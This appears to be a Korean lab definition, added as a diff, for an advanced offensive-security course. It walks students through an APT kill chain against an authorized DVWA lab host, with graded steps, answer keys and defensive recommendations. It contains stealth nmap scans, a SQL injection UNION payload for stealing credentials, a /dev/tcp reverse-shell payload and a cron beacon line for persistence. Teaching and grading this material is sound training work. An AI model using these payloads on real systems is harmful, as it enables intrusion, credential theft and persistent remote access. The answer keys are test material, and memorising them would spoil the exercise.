@@ -1,0 +1,258 @@
+lab_id: standalone-attack-adv-week01
+title: "APT 킬체인 — 정찰→열거→침투→발판→C2 전 단계"
+version: standalone-attack-adv
+course: attack-adv
+week: 1
+description: |
+  공격 고급 W01 — APT 킬체인. 한 번의 익스플로잇이 아니라 정찰→열거→침투→발판→지속성/C2로 이어지는 전
+  단계 캠페인을 수행한다. el34-attacker(모의침투 박스: nmap·sqlmap·hydra·gobuster·nc)에서 인가된 표적
+  (el34-web 10.20.30.1)에 킬체인을 실행하고, 공격 흔적·귀속(출처 IP 보존)을 이해한다.
+  ⚠️ 인가된 실습 환경(el34)에서만. 외부 시스템 공격 절대 금지. 모든 흔적은 self-clean.
+difficulty: hard
+duration_minutes: 190
+prerequisites:
+  - "attack 트랙 + soc-adv 킬체인/포렌식 이해"
+  - "el34 호스트 SSH + docker exec, el34-attacker 모의침투 박스"
+  - "lecture §2(킬체인 단계) §3(도구) §4(OPSEC/귀속) 숙지"
+objectives:
+  - "APT 킬체인 5단계를 순서대로 수행"
+  - "정찰·열거·침투·발판·C2의 도구와 기법 체득"
+  - "공격 흔적·귀속(출처 IP 보존)을 방어자 관점에서 이해"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 목표 — 모의침투 환경·표적 확인
+      ## 📖 개념 한 줄
+      킬체인의 시작 전, 공격 도구(attacker)와 인가된 표적(web)의 도달성을 확인한다.
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "command -v nmap sqlmap hydra gobuster nc >/dev/null && echo toolkit_ok; curl -s -o /dev/null -w 'target=%{http_code}' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"; echo; echo recon_env_ready
+      ```
+      ## ✅ 합격 기준
+      도구·표적이 확인되면(recon_env_ready) 통과.
+      ## ⚠️ 윤리
+      인가된 el34 표적(10.20.30.1)에만. 모든 행위는 교육 목적·self-clean.
+    hint: '환경 확인'
+    category: survey
+    points: 10
+    answer: |
+      echo "=== 모의침투 환경·표적 확인 ==="
+      docker exec el34-attacker sh -c "command -v nmap sqlmap hydra gobuster nc >/dev/null && echo toolkit_ok; curl -s -o /dev/null -w 'target=%{http_code}' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"; echo; echo recon_env_ready
+      echo "→ attacker 도구 + 인가 표적(10.20.30.1) 도달. 인가된 실습에서만 진행"
+    answer_detail: "환경 = el34-attacker(모의침투 도구)+el34-web(인가 표적). 킬체인 실습의 전제. 인가된 범위만."
+    verify:
+      type: output_contains
+      expect: 'recon_env_ready'
+      field: stdout
+      semantic: {intent: "환경 확인", success_criteria: ["도구/표적"], acceptable_methods: ["**[OSS] 모의침투 박스 (권장)**"]}
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## 🎯 킬체인 ① 정찰 (Reconnaissance, T1046)
+      ## 📖 개념 한 줄
+      표적의 공격 표면을 파악한다 — 어떤 포트·서비스가 열려 있나(스텔스 스캔으로 IDS 회피 시도).
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "nmap -sS -T2 --top-ports 100 10.20.30.1 2>/dev/null | grep -E 'open|PORT' | head"; echo recon_done
+      ```
+      ## ✅ 합격 기준
+      열린 포트·서비스가 식별되면(recon_done) 통과.
+      ## 🔧 도구 풀이
+      - nmap -sS(SYN 스캔, 은밀)·-T2(느리게=IDS 회피). NSE `--script vuln`으로 취약점 추정 가능.
+    hint: '정찰'
+    category: manipulation
+    points: 12
+    answer: |
+      echo "=== 킬체인① 정찰(T1046) ==="
+      docker exec el34-attacker sh -c "nmap -sS -T2 --top-ports 100 10.20.30.1 2>/dev/null | grep -E 'open|PORT' | head"; echo recon_done
+      echo "→ -sS(SYN 스텔스)·-T2(저속 IDS 회피)로 공격 표면 파악. 열린 포트=다음 공격 후보"
+    answer_detail: "정찰(T1046) = nmap 스텔스 스캔으로 공격 표면 파악. -sS/-T2로 IDS 회피 시도. 킬체인 1단계."
+    verify:
+      type: output_contains
+      expect: 'recon_done'
+      field: stdout
+      semantic: {intent: "정찰", success_criteria: ["포트 식별"], acceptable_methods: ["**[OSS] nmap (권장)**"]}
+    target_vm: web
+
+  - order: 3
+    instruction: |
+      ## 🎯 킬체인 ② 열거 (Enumeration)
+      ## 📖 개념 한 줄
+      웹 서비스를 발견했으면 숨은 경로·엔드포인트를 열거한다(디렉터리 브루트포스).
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "for p in login.php setup.php vulnerabilities security.php; do code=\$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' http://10.20.30.1/\$p); echo \$p=\$code; done"; echo enum_done
+      ```
+      ## ✅ 합격 기준
+      엔드포인트가 열거되면(enum_done) 통과.
+      ## 🔧 도구 풀이
+      - 실무: gobuster dir / nikto로 자동 열거. 여기선 curl로 핵심 경로 확인(빠른 데모).
+    hint: '열거'
+    category: manipulation
+    points: 12
+    answer: |
+      echo "=== 킬체인② 열거(Enumeration) ==="
+      docker exec el34-attacker sh -c "for p in login.php setup.php vulnerabilities security.php; do code=\$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' http://10.20.30.1/\$p); echo \$p=\$code; done"; echo enum_done
+      echo "→ 숨은 경로 열거(실무 gobuster/nikto). 응답 코드로 존재 경로 판별 → 공격 지점 좁히기"
+    answer_detail: "열거 = 숨은 경로/엔드포인트 발견(gobuster/nikto/curl). 공격 표면을 구체적 지점으로 좁힘."
+    verify:
+      type: output_contains
+      expect: 'enum_done'
+      field: stdout
+      semantic: {intent: "열거", success_criteria: ["엔드포인트"], acceptable_methods: ["**[OSS] gobuster/curl (권장)**"]}
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## 🎯 킬체인 ③ 침투 (Exploitation, T1190)
+      ## 📖 개념 한 줄
+      발견한 취약점을 악용해 침투한다 — SQLi로 데이터 탈취(귀속용 고유 태그 부착).
+      ## 💻 실행 명령
+      ```bash
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'exploit=%{http_code}' -A 'aa01r1-student' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit'"; echo; echo exploit_done
+      ```
+      ## ✅ 합격 기준
+      익스플로잇이 시도되면(exploit_done) 통과.
+      ## 🔧 도구 풀이
+      - 고유 태그(User-Agent aa01r1-<id>)로 내 공격을 노이즈와 구분(귀속). 실무: sqlmap 자동화.
+    hint: '침투'
+    category: analysis
+    points: 14
+    answer: |
+      echo "=== 킬체인③ 침투(T1190 SQLi) ==="
+      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'exploit=%{http_code}' -A 'aa01r1-student' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit'"; echo; echo exploit_done
+      echo "→ SQLi UNION으로 자격 탈취 시도. 고유 태그(aa01r1-student)로 귀속. 실무: sqlmap --tamper"
+    answer_detail: "침투(T1190) = SQLi UNION 데이터 탈취. 고유 태그로 귀속. sqlmap이 실무 자동화 도구. 킬체인 3단계."
+    verify:
+      type: output_contains
+      expect: 'exploit_done'
+      field: stdout
+      semantic: {intent: "침투", success_criteria: ["익스플로잇"], acceptable_methods: ["**[OSS] SQLi/sqlmap (권장)**"]}
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## 🎯 킬체인 ④ 발판/C2 (Foothold, T1059/T1071)
+      ## 📖 개념 한 줄
+      침투 후 지속 접근 채널을 만든다 — 리버스 셸 C2(공격자가 리스너, 피해자가 역접속).
+      ## 💻 실행 명령 (C2 채널 메커니즘 데모, 표적 미변경)
+      ```bash
+      docker exec el34-attacker sh -c "(timeout 1 nc -lvnp 55001 >/dev/null 2>&1 &) ; sleep 0.2; echo 'C2 리스너(55001) 기동'; echo '페이로드: bash -i >& /dev/tcp/ATTACKER/55001 0>&1'"; echo foothold_done
+      ```
+      ## ✅ 합격 기준
+      C2 채널 메커니즘이 시연되면(foothold_done) 통과.
+      ## 🔧 도구 풀이
+      - 리버스 셸: 피해자→공격자 역접속(아웃바운드라 방화벽 회피 쉬움). nc 리스너가 C2 수신.
+    hint: '발판/C2'
+    category: analysis
+    points: 14
+    answer: |
+      echo "=== 킬체인④ 발판/C2(T1059/T1071) ==="
+      docker exec el34-attacker sh -c "(timeout 1 nc -lvnp 55001 >/dev/null 2>&1 &) ; sleep 0.2; echo 'C2 리스너(55001) 기동'; echo '페이로드: bash -i >& /dev/tcp/ATTACKER/55001 0>&1'"; echo foothold_done
+      echo "→ 리버스 셸 = 피해자가 공격자로 역접속(아웃바운드=방화벽 회피). nc 리스너가 C2 수신(메커니즘 데모, 표적 미변경)"
+    answer_detail: "발판/C2 = 리버스 셸로 지속 접근. 아웃바운드 역접속이 방화벽 회피에 유리. nc/메타스플로잇이 C2. 킬체인 4단계."
+    verify:
+      type: output_contains
+      expect: 'foothold_done'
+      field: stdout
+      semantic: {intent: "발판/C2", success_criteria: ["리버스 셸"], acceptable_methods: ["**[OSS] nc 리버스셸 (권장)**"]}
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## 🎯 킬체인 ⑤ 지속성 (Persistence, T1053)
+      ## 📖 개념 한 줄
+      재부팅·세션 종료에도 살아남도록 지속성을 심는다 — cron 비콘이 주기적으로 C2 재접속.
+      ## 💻 실행 명령 (cron 비콘 문법 데모)
+      ```bash
+      echo "지속성 기법: cron 비콘 — 주기적으로 C2 재호출"
+      echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER/55001 0>&1' # /etc/cron.d/aa01beacon"
+      echo persistence_done
+      ```
+      ## ✅ 합격 기준
+      지속성 기법(cron 비콘)이 정리되면(persistence_done) 통과.
+      ## 🔧 도구 풀이
+      - 지속성: cron·systemd·웹셸·SSH 키·계정. 비콘=주기적 소량 C2(W07 flow에서 탐지됨).
+    hint: '지속성'
+    category: analysis
+    points: 12
+    answer: |
+      echo "=== 킬체인⑤ 지속성(T1053 cron) ==="
+      echo "지속성 기법: cron 비콘 — 주기적으로 C2 재호출"
+      echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER/55001 0>&1' # /etc/cron.d/aa01beacon"
+      echo "기타: systemd 서비스·웹셸·SSH authorized_keys·백도어 계정(atka01)"
+      echo "→ 지속성 = 재부팅에도 살아남는 거점. 단 cron/계정/포트는 방어자에게 탐지 흔적(soc-adv W06 헌팅)"
+      echo persistence_done
+    answer_detail: "지속성(T1053) = cron 비콘/systemd/웹셸/SSH키로 재부팅 후에도 접근 유지. 흔적은 헌팅에 잡힘. 킬체인 5단계."
+    verify:
+      type: output_contains
+      expect: 'persistence_done'
+      field: stdout
+      semantic: {intent: "지속성", success_criteria: ["cron/비콘"], acceptable_methods: ["**[OSS] cron 비콘 (권장)**"]}
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## 🎯 OPSEC·귀속 — 내가 남긴 흔적
+      ## 📖 개념 한 줄
+      공격자도 흔적을 남긴다 — el34는 출처 IP를 전 계층에 보존하므로 방어자가 귀속할 수 있다.
+      ## 💻 실행 명령
+      ```bash
+      echo "el34는 SNAT 없음 → 출처 IP(192.168.0.202)가 WAF/IPS/호스트 로그에 그대로. 고유 태그까지 = 완전 귀속"
+      echo opsec_done
+      ```
+      ## ✅ 합격 기준
+      공격 흔적·귀속 이해가 정리되면(opsec_done) 통과.
+    hint: 'OPSEC/귀속'
+    category: report
+    points: 12
+    answer: |
+      echo "=== OPSEC·귀속 — 내가 남긴 흔적 ==="
+      echo "정찰: 스캔이 IPS(Suricata)에 — -T2로 늦춰도 패턴 남음"
+      echo "침투: SQLi가 WAF(ModSec)·웹 로그에 + User-Agent 태그(aa01r1)"
+      echo "발판/지속성: C2 포트(55001)·cron(aa01beacon)·계정(atka01) = 호스트 흔적"
+      echo "귀속: el34는 SNAT 없음 → 출처 IP(192.168.0.202)가 전 계층 보존 → 방어자가 한 공격자로 상관(soc-adv W15)"
+      echo "→ 완벽한 은신은 없다. 공격자는 흔적을 최소화, 방어자는 흔적을 상관 — 창과 방패"
+      echo opsec_done
+    answer_detail: "OPSEC/귀속 = 공격은 전 계층에 흔적(스캔/SQLi/C2/cron). el34 출처 IP 보존으로 방어자가 귀속. 창과 방패."
+    verify:
+      type: output_contains
+      expect: 'opsec_done'
+      field: stdout
+      semantic: {intent: "OPSEC/귀속", success_criteria: ["흔적/귀속"], acceptable_methods: ["**[설명] OPSEC (권장)**"]}
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## 🎯 모의침투 보고서 (킬체인)
+      ## 💻 보고서 양식
+      ```markdown
+      # 공격고급 W01 APT 킬체인 보고서 (학번, 이름)
+      ## 1. 정찰·열거 결과
+      ## 2. 침투·발판·지속성(기법·증거)
+      ## 3. OPSEC/귀속·방어 권고
+      ```
+      ## ✅ 합격 기준
+      킬체인 5단계 + 기법 + 방어 권고 포함.
+    hint: '킬체인+기법+방어권고'
+    category: report
+    points: 14
+    answer: |
+      cat <<'EOF'
+      # 공격고급 W01 APT 킬체인 모의침투 보고서
+      ## 1. 정찰(nmap -sS -T2 스텔스)·열거(gobuster/curl 경로 발견)
+      ## 2. 침투(SQLi UNION 자격 탈취, 태그 aa01r1)→발판(리버스 셸 C2:55001)→지속성(cron 비콘 aa01beacon)
+      ## 3. OPSEC: 전 계층 흔적(스캔/SQLi/C2/cron). 귀속: 출처 IP 보존으로 방어자 상관 가능
+      ## 방어 권고: 입력검증(SQLi)·WAF·아웃바운드 통제(C2 차단)·cron/계정 모니터링(헌팅)·IDS 스캔 탐지
+      ## 결론: APT는 단발이 아닌 캠페인. 공격을 알아야 각 단계의 방어를 설계할 수 있다
+      EOF
+    answer_detail: "킬체인 보고 = 정찰/열거+침투/발판/지속성+OPSEC/방어권고. 공격 이해로 방어 설계. 공격고급의 출발점."
+    verify:
+      type: output_contains
+      expect: '킬체인'
+      field: stdout
+      semantic: {intent: "킬체인 보고", success_criteria: ["5단계/방어권고"], acceptable_methods: ["**[관리적] 보고서 (권장)**"]}
+    target_vm: web
